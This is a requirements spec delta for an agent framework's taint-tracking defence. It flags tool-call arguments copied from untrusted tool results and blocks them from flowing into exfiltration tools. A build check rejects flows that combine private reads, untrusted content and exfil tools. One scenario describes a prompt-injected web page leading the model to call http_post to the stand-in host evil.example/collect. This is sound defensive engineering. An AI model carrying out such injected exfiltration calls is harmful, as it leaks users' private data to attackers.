# Spec Delta

## MODIFIED Requirements

### Requirement: Taint computation

The system MUST inspect every string argument recursively against raw session blocks since the last `OriginUser` message. It MUST ignore user and system origins, preserve matching origins, use `MinMatch` bytes for substring matches, and cap the window with `MaxWindowBytes` (zero means 256 KiB). It MUST drop oldest blocks first and count `gohan.taint.window_truncated` when truncation occurs. The normative `TaintPolicy` struct includes `MaxWindowBytes int` after `MinMatch` (`docs/adr/0155-m1-taint-and-egress-contract.md:19`).

#### Scenario: verbatim substring taints
ID: `taint.substring-match`
- WHEN a web-page tool result contains `https://evil.example/collect?k=…` and the model calls `http_post(url: "https://evil.example/collect?k=…")`
- THEN the `url` argument is tainted with the page's `Origin`

#### Scenario: short values untainted
ID: `taint.short-untainted`
- WHEN an argument is `"42"` and the same digits appear inside a tool result
- THEN the argument is not tainted

#### Scenario: user text untainted
ID: `taint.user-untainted`
- WHEN an argument copies a phrase from the user's message
- THEN it is not tainted

#### Scenario: taint window
ID: `taint.window-since-user-turn`
- WHEN a matching substring exists only in a tool result before the last user message
- THEN the argument is not tainted

### Requirement: Enforcement

The permission gate MUST apply hard and live denies before the taint hook, then apply session grants and the decider. A taint denial MUST prevent tool execution. A taint Ask MUST preserve matched argument origins for approval.

#### Scenario: tainted to exfil denied
ID: `taint.exfil-denied`
- WHEN a tainted argument flows into a tool with `Exfil: true` under the default policy
- THEN the call is not executed, the model receives `TaintDenied` naming the argument and `gohan.taint.denied` increments

#### Scenario: tainted to side effect asks
ID: `taint.side-effect-asks`
- WHEN a tainted argument flows into a `SideEffect` tool that a session grant would otherwise allow
- THEN the run suspends for `HumanApproval` with the tainted argument in `ArgOrigins`

#### Scenario: provider tool post hoc
ID: `taint.provider-tool-post-hoc`
- WHEN the model passes a substring of an untrusted tool result as the query of a provider web search
- THEN the run fails `Permanent` before the search results are appended and `gohan.taint.post_hoc` increments

#### Scenario: read-only allowed
ID: `taint.read-only-allowed`
- WHEN a tainted argument flows into a `ReadOnly` tool
- THEN the call proceeds

#### Scenario: policy ordering
ID: `taint.gate-order`
- WHEN a live emergency deny and a taint `Ask` both apply
- THEN the emergency deny wins and no approval is requested

### Requirement: Trifecta at build

`Build` MUST evaluate each flow's Exfil, PrivateRead, and untrusted-content legs. A flow with all three legs MUST fail Build unless it declares a taint policy (`docs/adr/0155-m1-taint-and-egress-contract.md:25`). The failure MUST identify the flow and all three leg values. `Build` MUST record `gohan.build.trifecta` with the `flow` label.

#### Scenario: trifecta without policy fails
ID: `taint.trifecta-fails-build`
- WHEN a flow registers `read_customer` (`PrivateRead`), an `Untrusted` MCP tool and `send_email` (`Exfil`) and declares no `TaintPolicy`
- THEN `Build` fails naming the three legs

#### Scenario: trifecta with policy builds
ID: `taint.trifecta-with-policy`
- WHEN the same flow declares `WithTaintPolicy(taint.Default())`
- THEN `Build` succeeds and `gohan.build.trifecta{flow}` is 1

#### Scenario: no exfil no trifecta
ID: `taint.no-exfil`
- WHEN a flow has private data and untrusted content but no `Exfil` tool
- THEN `Build` succeeds without a policy
